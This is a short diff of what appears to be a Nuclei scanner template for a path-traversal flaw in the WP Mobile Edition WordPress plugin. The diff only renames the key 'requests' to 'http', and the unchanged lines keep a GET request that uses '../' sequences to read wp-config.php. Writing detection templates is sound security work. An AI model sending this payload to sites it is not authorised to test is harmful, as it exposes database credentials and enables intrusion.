@@ -8,7 +8,7 @@ info:
   description: Wordpress Plugin WP Mobile Edition is not filtering data in GET parameter files in file themes/mTheme-Unus/css/css.php
   reference: https://www.exploit-db.com/exploits/36733
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
